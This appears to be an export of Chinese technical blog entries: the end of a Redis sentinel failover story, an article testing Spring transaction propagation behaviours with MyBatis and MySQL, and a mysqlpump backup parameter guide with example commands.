

我们用上了新的数据同步策略，效率高了不少，就算偶尔掉个线，也能很快把缺失的数据给补上。
哨兵、主从切换
解决主从同步master宕机后的主从切换问题。
监控：检查主从服务器是否运行异常
提醒：通过API向管理员或者其他应用程序发送故障通知。
自动故障迁移：主从切换。

就这样过了一段时间 ···




新添了人手，我们准备大干一场！
为了及时获得和更新主从节点的信息，咱们哨兵每隔十秒钟就要用 INFO 命令去问候一下主节点，主节点会告诉我他有哪些从节点


为了更加及时知道大家是否掉线，咱们哨兵每隔一秒都要用 PING 命令问候一下群里的各个小伙伴：




如果在设置的时间里没有收到回复，我就知道这家伙多半是跪了，就该启动故障转移了
不过这只是我的主观意见，光我一个人说了不算，为了防止误判，我还得去管理员小群里征求一下大家的意见：








接下来，咱们就开始了第一次选举。






经过一番努力，我终于完成了故障转移，现在 R2 是主节点了。
不过没过多久，R1 又回来了：


以上就是我们的日常工作了，通过咱们几个小伙伴的齐心协力，构成了一个高可用的缓存服务，MySQL 大哥再也不敢小瞧我们了。




原文地址还不懂Redis？看完这个故事就明白了！
突然挂了！Redis缓存都在内存中，这下完了！
假如把Redis服务器们拉到一个群，看看他们是怎么工作的？
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring事务传播机制</title>
    <url>/2021/05/24/Spring%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E8%A1%8C%E4%B8%BA%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[前言Spring 在 TransactionDefinition 接口中规定了 7 种类型的事务传播行为。事务传播行为是 Spring 框架独有的事务增强特性，他不属于的事务实际提供方数据库行为。这是 Spring 为我们提供的强大的工具箱，使用事务传播行可以为我们的开发工作提供许多便利。但是人们对他的误解也颇多，你一定也听过 “service 方法事务最好不要嵌套” 的传言。要想正确的使用工具首先需要了解工具。本文对七种事务传播行为做详细介绍，内容主要代码示例的方式呈现。


基础概念什么是事务传播行为？事务传播行为用来描述由某一个事务传播行为修饰的方法被嵌套进另一个方法的时事务如何传播。
用伪代码说明：
public void methodA()&#123;
    methodB();
    &#x2F;&#x2F;doSomething
&#125;

@Transaction(Propagation&#x3D;XXX)
public void methodB()&#123;
    &#x2F;&#x2F;doSomething
&#125;

代码中methodA()方法嵌套调用了methodB()方法，methodB()的事务传播行为由@Transaction(Propagation=XXX)设置决定。这里需要注意的是methodA()并没有开启事务，某一个事务传播行为修饰的方法并不是必须要在开启事务的外围方法中调用。
Spring 中七种事务传播行为


事务传播行为类型
说明



PROPAGATION_REQUIRED
如果当前没有事务，就新建一个事务，如果已经存在一个事务中，加入到这个事务中。这是最常见的选择。


PROPAGATION_SUPPORTS
支持当前事务，如果当前没有事务，就以非事务方式执行。


PROPAGATION_MANDATORY
使用当前的事务，如果当前没有事务，就抛出异常。


PROPAGATION_REQUIRES_NEW
新建事务，如果当前存在事务，把当前事务挂起。


PROPAGATION_NOT_SUPPORTED
以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。


PROPAGATION_NEVER
以非事务方式执行，如果当前存在事务，则抛出异常。


PROPAGATION_NESTED
如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行与PROPAGATION_REQUIRED类似的操作。


定义非常简单，也很好理解，下面我们就进入代码测试部分，验证我们的理解是否正确。
代码验证文中代码以传统三层结构中两层呈现，即 Service 和 Dao 层，由 Spring 负责依赖注入和注解式事务管理，DAO 层由 Mybatis 实现，你也可以使用任何喜欢的方式，例如，Hibernate，JPA，JDBCTemplate 等。数据库使用的是 MySQL 数据库，你也可以使用任何支持事务的数据库，并不会影响验证结果。
首先我们在数据库中创建两张表：
user1
CREATE TABLE &#96;user1&#96; (
  &#96;id&#96; INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,
  &#96;name&#96; VARCHAR(45) NOT NULL DEFAULT &#39;&#39;,
  PRIMARY KEY(&#96;id&#96;)
)
ENGINE &#x3D; InnoDB;

user2
CREATE TABLE &#96;user2&#96; (
  &#96;id&#96; INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,
  &#96;name&#96; VARCHAR(45) NOT NULL DEFAULT &#39;&#39;,
  PRIMARY KEY(&#96;id&#96;)
)
ENGINE &#x3D; InnoDB;

然后编写相应的 Bean 和 DAO 层代码：
User1
public class User1 &#123;
    private Integer id;
    private String name;
   &#x2F;&#x2F;get和set方法省略...
&#125;

User2
public class User2 &#123;
    private Integer id;
    private String name;
   &#x2F;&#x2F;get和set方法省略...
&#125;

User1Mapper
public interface User1Mapper &#123;
    int insert(User1 record);
    User1 selectByPrimaryKey(Integer id);
    &#x2F;&#x2F;其他方法省略...
&#125;

User2Mapper
public interface User2Mapper &#123;
    int insert(User2 record);
    User2 selectByPrimaryKey(Integer id);
    &#x2F;&#x2F;其他方法省略...
&#125;

最后也是具体验证的代码由 service 层实现，下面我们分情况列举。
1. PROPAGATION_REQUIRED我们为 User1Service 和 User2Service 相应方法加上Propagation.REQUIRED属性。
User1Service 方法：
@Service
public class User1ServiceImpl implements User1Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRED)
    public void addRequired(User1 user)&#123;
        user1Mapper.insert(user);
    &#125;
&#125;

User2Service 方法：
@Service
public class User2ServiceImpl implements User2Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRED)
    public void addRequired(User2 user)&#123;
        user2Mapper.insert(user);
    &#125;
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRED)
    public void addRequiredException(User2 user)&#123;
        user2Mapper.insert(user);
        throw new RuntimeException();
    &#125;
    
&#125;

1.1 场景一此场景外围方法没有开启事务。
验证方法 1：
@Override
public void notransaction_exception_required_required()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequired(user2);

    throw new RuntimeException();
&#125;

验证方法 2：
@Override
public void notransaction_required_required_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiredException(user2);
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”、“李四”均插入。
外围方法未开启事务，插入“张三”、“李四”方法在自己的事务中独立运行，外围方法异常不影响内部插入“张三”、“李四”方法独立的事务。


2
“张三”插入，“李四”未插入。
外围方法没有事务，插入“张三”、“李四”方法都在自己的事务中独立运行,所以插入“李四”方法抛出异常只会回滚插入“李四”方法，插入“张三”方法不受影响。


结论：通过这两个方法我们证明了在外围方法未开启事务的情况下Propagation.REQUIRED修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。
1.2 场景二外围方法开启事务，这个是使用率比较高的场景。
验证方法 1：
@Override
@Transactional(propagation &#x3D; Propagation.REQUIRED)
public void transaction_exception_required_required()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequired(user2);

    throw new RuntimeException();
&#125;

验证方法 2：
@Override
@Transactional(propagation &#x3D; Propagation.REQUIRED)
public void transaction_required_required_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiredException(user2);
&#125;

验证方法 3：
@Transactional
@Override
public void transaction_required_required_exception_try()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    try &#123;
        user2Service.addRequiredException(user2);
    &#125; catch (Exception e) &#123;
        System.out.println(&quot;方法回滚&quot;);
    &#125;
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”、“李四”均未插入。
外围方法开启事务，内部方法加入外围方法事务，外围方法回滚，内部方法也要回滚。


2
“张三”、“李四”均未插入。
外围方法开启事务，内部方法加入外围方法事务，内部方法抛出异常回滚，外围方法感知异常致使整体事务回滚。


3
“张三”、“李四”均未插入。
外围方法开启事务，内部方法加入外围方法事务，内部方法抛出异常回滚，即使方法被catch不被外围方法感知，整个事务依然回滚。


结论：以上试验结果我们证明在外围方法开启事务的情况下Propagation.REQUIRED修饰的内部方法会加入到外围方法的事务中，所有Propagation.REQUIRED修饰的内部方法和外围方法均属于同一事务，只要一个方法回滚，整个事务均回滚。
2. PROPAGATION_REQUIRES_NEW我们为 User1Service 和 User2Service 相应方法加上Propagation.REQUIRES_NEW属性。User1Service 方法：
@Service
public class User1ServiceImpl implements User1Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRES_NEW)
    public void addRequiresNew(User1 user)&#123;
        user1Mapper.insert(user);
    &#125;
    
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRED)
    public void addRequired(User1 user)&#123;
        user1Mapper.insert(user);
    &#125;
&#125;

User2Service 方法：
@Service
public class User2ServiceImpl implements User2Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRES_NEW)
    public void addRequiresNew(User2 user)&#123;
        user2Mapper.insert(user);
    &#125;

    @Override
    @Transactional(propagation &#x3D; Propagation.REQUIRES_NEW)
    public void addRequiresNewException(User2 user)&#123;
        user2Mapper.insert(user);
        throw new RuntimeException();
    &#125;
&#125;

2.1 场景一外围方法没有开启事务。
验证方法 1：
@Override
public void notransaction_exception_requiresNew_requiresNew()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequiresNew(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiresNew(user2);
    throw new RuntimeException();

&#125;

验证方法 2：
@Override
public void notransaction_requiresNew_requiresNew_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequiresNew(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiresNewException(user2);
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”插入，“李四”插入。
外围方法没有事务，插入“张三”、“李四”方法都在自己的事务中独立运行,外围方法抛出异常回滚不会影响内部方法。


2
“张三”插入，“李四”未插入
外围方法没有开启事务，插入“张三”方法和插入“李四”方法分别开启自己的事务，插入“李四”方法抛出异常回滚，其他事务不受影响。


结论：通过这两个方法我们证明了在外围方法未开启事务的情况下Propagation.REQUIRES_NEW修饰的内部方法会新开启自己的事务，且开启的事务相互独立，互不干扰。
2.2 场景二外围方法开启事务。
验证方法 1：
@Override
@Transactional(propagation &#x3D; Propagation.REQUIRED)
public void transaction_exception_required_requiresNew_requiresNew()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiresNew(user2);

    User2 user3&#x3D;new User2();
    user3.setName(&quot;王五&quot;);
    user2Service.addRequiresNew(user3);
    throw new RuntimeException();
&#125;

验证方法 2：
@Override
@Transactional(propagation &#x3D; Propagation.REQUIRED)
public void transaction_required_requiresNew_requiresNew_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiresNew(user2);

    User2 user3&#x3D;new User2();
    user3.setName(&quot;王五&quot;);
    user2Service.addRequiresNewException(user3);
&#125;

验证方法 3：
@Override
@Transactional(propagation &#x3D; Propagation.REQUIRED)
public void transaction_required_requiresNew_requiresNew_exception_try()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addRequired(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addRequiresNew(user2);
    User2 user3&#x3D;new User2();
    user3.setName(&quot;王五&quot;);
    try &#123;
        user2Service.addRequiresNewException(user3);
    &#125; catch (Exception e) &#123;
        System.out.println(&quot;回滚&quot;);
    &#125;
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”未插入，“李四”插入，“王五”插入。
外围方法开启事务，插入“张三”方法和外围方法一个事务，插入“李四”方法、插入“王五”方法分别在独立的新建事务中，外围方法抛出异常只回滚和外围方法同一事务的方法，故插入“张三”的方法回滚。


2
“张三”未插入，“李四”插入，“王五”未插入。
外围方法开启事务，插入“张三”方法和外围方法一个事务，插入“李四”方法、插入“王五”方法分别在独立的新建事务中。插入“王五”方法抛出异常，首先插入 “王五”方法的事务被回滚，异常继续抛出被外围方法感知，外围方法事务亦被回滚，故插入“张三”方法也被回滚。


3
“张三”插入，“李四”插入，“王五”未插入。
外围方法开启事务，插入“张三”方法和外围方法一个事务，插入“李四”方法、插入“王五”方法分别在独立的新建事务中。插入“王五”方法抛出异常，首先插入“王五”方法的事务被回滚，异常被catch不会被外围方法感知，外围方法事务不回滚，故插入“张三”方法插入成功。


结论：在外围方法开启事务的情况下Propagation.REQUIRES_NEW修饰的内部方法依然会单独开启独立事务，且与外部方法事务也独立，内部方法之间、内部方法和外部方法事务均相互独立，互不干扰。
3. PROPAGATION_NESTED我们为 User1Service 和 User2Service 相应方法加上Propagation.NESTED属性。User1Service 方法：
@Service
public class User1ServiceImpl implements User1Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.NESTED)
    public void addNested(User1 user)&#123;
        user1Mapper.insert(user);
    &#125;
&#125;

User2Service 方法：
@Service
public class User2ServiceImpl implements User2Service &#123;
    &#x2F;&#x2F;省略其他...
    @Override
    @Transactional(propagation &#x3D; Propagation.NESTED)
    public void addNested(User2 user)&#123;
        user2Mapper.insert(user);
    &#125;
    
    @Override
    @Transactional(propagation &#x3D; Propagation.NESTED)
    public void addNestedException(User2 user)&#123;
        user2Mapper.insert(user);
        throw new RuntimeException();
    &#125;
&#125;

3.1 场景一此场景外围方法没有开启事务。
验证方法 1：
@Override
public void notransaction_exception_nested_nested()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addNested(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addNested(user2);
    throw new RuntimeException();
&#125;

验证方法 2：
@Override
public void notransaction_nested_nested_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addNested(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addNestedException(user2);
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”、“李四”均插入。
外围方法未开启事务，插入“张三”、“李四”方法在自己的事务中独立运行，外围方法异常不影响内部插入“张三”、“李四”方法独立的事务。


2
“张三”插入，“李四”未插入。
外围方法没有事务，插入“张三”、“李四”方法都在自己的事务中独立运行,所以插入“李四”方法抛出异常只会回滚插入“李四”方法，插入“张三”方法不受影响。


结论：通过这两个方法我们证明了在外围方法未开启事务的情况下Propagation.NESTED和Propagation.REQUIRED作用相同，修饰的内部方法都会新开启自己的事务，且开启的事务相互独立，互不干扰。
3.2 场景二外围方法开启事务。
验证方法 1：
@Transactional
@Override
public void transaction_exception_nested_nested()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addNested(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addNested(user2);
    throw new RuntimeException();
&#125;

验证方法 2：
@Transactional
@Override
public void transaction_nested_nested_exception()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addNested(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    user2Service.addNestedException(user2);
&#125;

验证方法 3：
@Transactional
@Override
public void transaction_nested_nested_exception_try()&#123;
    User1 user1&#x3D;new User1();
    user1.setName(&quot;张三&quot;);
    user1Service.addNested(user1);

    User2 user2&#x3D;new User2();
    user2.setName(&quot;李四&quot;);
    try &#123;
        user2Service.addNestedException(user2);
    &#125; catch (Exception e) &#123;
        System.out.println(&quot;方法回滚&quot;);
    &#125;
&#125;

分别执行验证方法，结果：



验证方法序号
数据库结果
结果分析



1
“张三”、“李四”均未插入。
外围方法开启事务，内部事务为外围事务的子事务，外围方法回滚，内部方法也要回滚。


2
“张三”、“李四”均未插入。
外围方法开启事务，内部事务为外围事务的子事务，内部方法抛出异常回滚，且外围方法感知异常致使整体事务回滚。


3
“张三”插入、“李四”未插入。
外围方法开启事务，内部事务为外围事务的子事务，插入“李四”内部方法抛出异常，可以单独对子事务回滚。


结论：以上试验结果我们证明在外围方法开启事务的情况下Propagation.NESTED修饰的内部方法属于外部事务的子事务，外围主事务回滚，子事务一定回滚，而内部子事务可以单独回滚而不影响外围主事务和其他子事务
4. REQUIRED, REQUIRES_NEW, NESTED 异同
由 “1.2 场景二” 和“3.2 场景二”对比，我们可知：

NESTED和 REQUIRED 修饰的内部方法都属于外围方法事务，如果外围方法抛出异常，这两种方法的事务都会被回滚。但是 REQUIRED 是加入外围方法事务，所以和外围事务同属于一个事务，一旦 REQUIRED 事务抛出异常被回滚，外围方法事务也将被回滚。而 NESTED 是外围方法的子事务，有单独的保存点，所以 NESTED 方法抛出异常被回滚，不会影响到外围方法的事务。

由 “2.2 场景二” 和“3.2 场景二”对比，我们可知：

NESTED 和 REQUIRES_NEW 都可以做到内部方法事务回滚而不影响外围方法事务。但是因为 NESTED 是嵌套事务，所以外围方法回滚之后，作为外围方法事务的子事务也会被回滚。而 REQUIRES_NEW 是通过开启新的事务实现的，内部事务和外围事务是两个事务，外围事务回滚不会影响内部事务。
5. 其他事务传播行为鉴于文章篇幅问题，其他事务传播行为的测试就不在此一一描述了，感兴趣的读者可以去源码中自己寻找相应测试代码和结果解释。传送门：https://github.com/TmTse/tran...
模拟用例介绍了这么多事务传播行为，我们在实际工作中如何应用呢？下面我来举一个示例：
假设我们有一个注册的方法，方法中调用添加积分的方法，如果我们希望添加积分不会影响注册流程（即添加积分执行失败回滚不能使注册方法也回滚），我们会这样写：
@Service
public class UserServiceImpl implements UserService &#123;
    @Transactional
    public void register(User user)&#123;
        try &#123;
            membershipPointService.addPoint(Point point);
        &#125; catch (Exception e) &#123;
            &#x2F;&#x2F;省略...
        &#125;
        &#x2F;&#x2F;省略...
    &#125;
    &#x2F;&#x2F;省略...
&#125;

我们还规定注册失败要影响addPoint()方法（注册方法回滚添加积分方法也需要回滚），那么addPoint()方法就需要这样实现：
@Service
public class MembershipPointServiceImpl implements MembershipPointService&#123;
    @Transactional(propagation &#x3D; Propagation.NESTED)
    public void addPoint(Point point)&#123;
        try &#123;
            recordService.addRecord(Record record);
        &#125; catch (Exception e) &#123;
            &#x2F;&#x2F;省略...
        &#125;
        &#x2F;&#x2F;省略...
    &#125;
    &#x2F;&#x2F;省略...
&#125;

我们注意到了在addPoint()中还调用了addRecord()方法，这个方法用来记录日志。他的实现如下：
@Service
public class RecordServiceImpl implements RecordService&#123;
    @Transactional(propagation &#x3D; Propagation.NOT_SUPPORTED)
    public void addRecord(Record record)&#123;
        &#x2F;&#x2F;省略...
    &#125;
    &#x2F;&#x2F;省略...
&#125;

我们注意到addRecord()方法中propagation = Propagation.NOT_SUPPORTED，因为对于日志无所谓精确，可以多一条也可以少一条，所以addRecord()方法本身和外围addPoint()方法抛出异常都不会使addRecord()方法回滚，并且addRecord()方法抛出异常也不会影响外围addPoint()方法的执行。
通过这个例子相信大家对事务传播行为的使用有了更加直观的认识，通过各种属性的组合确实能让我们的业务实现更加灵活多样。
结论通过上面的介绍，相信大家对 Spring 事务传播行为有了更加深入的理解，希望大家日常开发工作有所帮助。

转载：https://segmentfault.com/a/1190000013341344

]]></content>
      <tags>
        <tag>Spring</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlpump使用说明</title>
    <url>/2021/02/27/mysqlpump%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[下面介绍 MySQL5.7 之后新添加的备份工具 mysqlpump。
mysqlpump 是 mysqldump 的一个衍生，mysqldump 备份功能这里就不多说了，现在看看 mysqlpump 到底有了哪些提升，详细可以查看官网文档。
mysqlpump 和 mysqldump 一样，属于逻辑备份，备份以 SQL 形式的文本保存。逻辑备份相对物理备份好处是不关心 log 的大小，直接备份数据即可。


mysqlpump 主要特点-  并行备份数据库和数据库中的对象的，加快备份过程。-  更好的控制数据库和数据库对象（表，存储过程，用户帐户）的备份。-  备份用户账号作为帐户管理语句（CREATE USER，GRANT），而不是直接插入到 MySQL 的系统数据库。-  备份出来直接生成压缩后的备份文件。-  备份进度指示（估计值）。-  重新加载（还原）备份文件，先建表后插入数据最后建立索引，减少了索引维护开销，加快了还原速度。-  备份可以排除或则指定数据库。
mysqlpump 缺点https://theme-next.js.org/highlight/-  只能并行到表级别, 如果表特别大, 开多线程和单线程是一样的, 并行度不如 mydumper；-  无法获取当前备份对应的 binlog 位置；-  MySQL5.7.11 之前的版本不要使用, 并行导出和 single-transaction 是互斥的；
参数说明mysqlpump 绝大部分参数使用和 Mysqldump 一致，下面顺便重温一下。注意对于 mysqlpump 专有参数会用加粗标记出来。
1) --add-drop-database： 在建立库之前先执行删库操作
DROP DATABASE IF EXISTS &#96;...&#96;;


--add-drop-table：在建表之前先执行删表操作

DROP TABLE IF EXISTS &#96;...&#96;.&#96;...&#96;;

3) --add-drop-user：在 CREATE USER 语句之前增加 DROP USER。 注意：这个参数需要和 --users 一起使用，否者不生效。
DROP USER &#39;backup&#39;@&#39;172.16.60.%&#39;;


--add-locks：备份表时，使用 LOCK TABLES 和 UNLOCK TABLES。注意：这个参数不支持并行备份，需要关闭并行备份功能：--default-parallelism=0

LOCK TABLES &#96;...&#96;.&#96;...&#96; WRITE;
...
UNLOCK TABLES;


--all-databases：备份所有库，即 -A。

--bind-address：指定通过哪个网络接口来连接 Mysql 服务器（一台服务器可能有多个 IP），防止同一个网卡出去影响业务。

--complete-insert：dump 出包含所有列的完整 insert 语句。

--compress： 压缩客户端和服务器传输的所有的数据，即 -C。

--compress-output：默认不压缩输出，目前可以使用的压缩算法有 LZ4 和 ZLIB


[root@localhost ~]# mysqlpump --compress-output&#x3D;LZ4 &gt; dump.lz4
[root@localhost ~]# lz4_decompress dump.lz4 dump.txt
 
[root@localhost ~]# mysqlpump --compress-output&#x3D;ZLIB &gt; dump.zlib
[root@localhost ~]# zlib_decompress dump.zlib dump.txt


--databases：手动指定要备份的库，支持多个数据库，用空格分隔，即 - B。

--default-character-set：指定备份的字符集。


12) --default-parallelism：指定并行线程数，默认是 2，如果设置成 0，表示不使用并行备份。注意：每个线程的备份步骤是：先 create table 但不建立二级索引（主键会在 create table 时候建立），再写入数据，最后建立二级索引。
13) --defer-table-indexes：延迟创建索引，直到所有数据都加载完之后，再创建索引，默认开启。若关闭则会和 mysqldump 一样：先创建一个表和所有索引，再导入数据，因为在加载还原数据的时候要维护二级索引的开销，导致效率比较低。关闭使用参数：--skip--defer-table-indexes。

--events：备份数据库的事件，默认开启，关闭使用 --skip-events 参数。

15) --exclude-databases：备份排除该参数指定的数据库，多个用逗号分隔。类似的还有 --exclude-events、--exclude-routines、--exclude-tables、--exclude-triggers、--exclude-users
[root@localhost ~]# mysqlpump --exclude-databases&#x3D;mysql,sys -p123456 --set-gtid-purged&#x3D;off &gt;&#x2F;root&#x2F;db.sql   #备份过滤mysql和sys数据库
[root@localhost ~]# mysqlpump --exclude-tables&#x3D;rr,tt -p123456 --set-gtid-purged&#x3D;off &gt; &#x2F;root&#x2F;db.sql      #备份过滤所有数据库中rr、tt表
[root@localhost ~]# mysqlpump -B test --exclude-tables&#x3D;tmp_ifulltext,tt -p123456 --set-gtid-purged&#x3D;off &gt;&#x2F;root&#x2F;db.sql   #备份过滤test库中的rr、tt表
...

注意：要是只备份数据库的账号，需要添加参数 --users，并且需要过滤掉所有的数据库，如
#备份除dba和backup的所有账号。
[root@localhost ~]# mysqlpump --users --exclude-databases&#x3D;sys,mysql,db1,db2 --exclude-users&#x3D;dba,backup -p123456 --set-gtid-purged&#x3D;off &gt;&#x2F;root&#x2F;db.sql

16) --include-databases：指定备份数据库，多个用逗号分隔，类似的还有 --include-events、--include-routines、--include-tables、--include-triggers、--include-users，大致方法使用同 15。

--insert-ignore：备份用 insert ignore 语句代替 insert 语句。

--log-error-file：备份出现的 warnings 和 erros 信息输出到一个指定的文件。

--max-allowed-packet：备份时用于 client/server 直接通信的最大 buffer 包的大小。

--net-buffer-length：备份时用于 client/server 通信的初始 buffer 大小，当创建多行插入语句的时候，mysqlpump 创建行到 N 个字节长。

--no-create-db：备份不写 CREATE DATABASE 语句。要是备份多个库，需要使用参数 - B，而使用 - B 的时候会出现 create database 语句，该参数可以屏蔽 create database 语句。

--no-create-info：备份不写建表语句，即不备份表结构，只备份数据，即 -t。

--hex-blob： 备份 binary 字段的时候使用十六进制计数法，受影响的字段类型有 BINARY、VARBINARY、BLOB、BIT。

--host ：备份指定的数据库地址，即 -h。


25) --parallel-schemas=[N：]db_list：指定并行备份的库，多个库用逗号分隔，如果指定了 N，将使用 N 个线程的地队列，如果 N 不指定，将由 --default-parallelism 才确认 N 的值，可以设置多个 --parallel-schemas
#4个线程备份vs和aa，3个线程备份pt。通过show processlist 可以看到有7个线程。
[root@localhost ~]# mysqlpump --parallel-schemas&#x3D;4：vs,aa --parallel-schemas&#x3D;3：pt  -p123456 --set-gtid-purged&#x3D;off &gt; &#x2F;root&#x2F;db.sql  
 
#默认2个线程，即2个线程备份vs和abc，2个线程备份pt
[root@localhost ~]# mysqlpump --parallel-schemas&#x3D;vs,abc --parallel-schemas&#x3D;pt  -p123456 --set-gtid-purged&#x3D;off &gt; &#x2F;root&#x2F;db.sql  
 
#当然要是硬盘IO不允许的话，可以少开几个线程和数据库进行并行备份


--password：备份需要的密码。

--port ：备份数据库的端口。

--protocol={TCP|SOCKET|PIPE|MEMORY}：指定连接服务器的协议。

--replace：备份出来 replace into 语句。

--routines：备份出来包含存储过程和函数，默认开启，需要对 mysql.proc 表有查看权限。生成的文件中会包含 CREATE PROCEDURE 和 CREATE FUNCTION 语句以用于恢复，关闭则需要用 --skip-routines 参数。

--triggers：备份出来包含触发器，默认开启，使用 --skip-triggers 来关闭。

--set-charset：备份文件里写 SET NAMES default_character_set 到输出，此参默认开启。 -- skip-set-charset 禁用此参数，不会在备份文件里面写出 set names...

--single-transaction：该参数在事务隔离级别设置成 Repeatable Read，并在 dump 之前发送 start transaction 语句给服务端**。这在使用 innodb 时很有用，因为在发出 start transaction 时，保证了在不阻塞任何应用下的一致性状态。对 myisam 和 memory 等非事务表，还是会改变状态的，当使用此参的时候要确保没有其他连接在使用 ALTER TABLE、CREATE TABLE、DROP TABLE、RENAME TABLE、TRUNCATE TABLE 等语句，否则会出现不正确的内容或则失败。--add-locks 和此参互斥，在 mysql5.7.11 之前，--default-parallelism 大于 1 的时候和此参也互斥，必须使用 --default-parallelism=0。5.7.11 之后解决了 --single-transaction 和 --default-parallelism 的互斥问题。

--skip-definer：忽略那些创建视图和存储过程用到的 DEFINER 和 SQL SECURITY 语句，恢复的时候，会使用默认值，否则会在还原的时候看到没有 DEFINER 定义时的账号而报错。**

--skip-dump-rows：只备份表结构，不备份数据，即 -d。注意：mysqldump 支持 --no-data，mysqlpump 不支持 --no-data**

--socket：对于连接到 localhost，Unix 使用套接字文件，在 Windows 上是命名管道的名称使用，即 -S。

--ssl：--ssl 参数将要被去除，用 --ssl-mode 取代**。关于 ssl 相关的备份。

--tz-utc：备份时会在备份文件的最前几行添加 SET TIME_ZONE=&#39;+00：00&#39;。注意：如果还原的服务器不在同一个时区并且还原表中的列有 timestamp 字段，会导致还原出来的结果不一致。默认开启该参数，用 --skip-tz-utc 来关闭参数。

--user：备份时候的用户名，即 -u。

--users：备份数据库用户，备份的形式是 CREATE USER...，GRANT...，只备份数据库账号可以通过如下命令**


#过滤掉所有数据库
[root@localhost ~]# mysqlpump --exclude-databases&#x3D;% --users  -p123456 --set-gtid-purged&#x3D;off &gt;&#x2F;root&#x2F;db.sql


--watch-progress：定期显示进度的完成，包括总数表、行和其他对象。该参数默认开启，用 --skip-watch-progress 来关闭。 

mysqlpump 的多线程架构图如下

-  mysqlpump 是 MySQL5.7 的官方工具, 用于取代 mysqldump, 其参数与 mysqldump 基本一样；-  mysqlpump 是多线程备份, 但只能到表级别, 单表备份还是单线程；-  mysqldump 备份时, 有个默认队列（default）, 队列下开 N 个线程去备份数据库 / 数据库中的表；-  支持开多个队列 (对应不同库 / 表), 然后每个队列设置不同线程, 进行备份；
mysqlpump 支持基于库和表的并行导出，mysqlpump 的并行导出功能的架构为：队列 + 线程，允许有多个队列（**--parallel-schemas），每个队列下有多个线程（N），而一个队列可以绑定 1 个或者多个数据库（逗号分隔）。mysqlpump 的备份是基于表并行的，对于每张表的导出只能是单个线程的**，这里会有个限制是如果某个数据库有一张表非常大，可能大部分的时间都是消耗在这个表的备份上面，并行备份的效果可能就不明显。这里可以利用 Mydumper 其是以 chunk 的方式批量导出，即 Mydumper 支持一张表多个线程以 chunk 的方式批量导出。但相对于 Mysqldump 有很大提升。
对比测试如下mysqlpump压缩备份kevin数据库 三个并发线程备份，消耗时间：222s
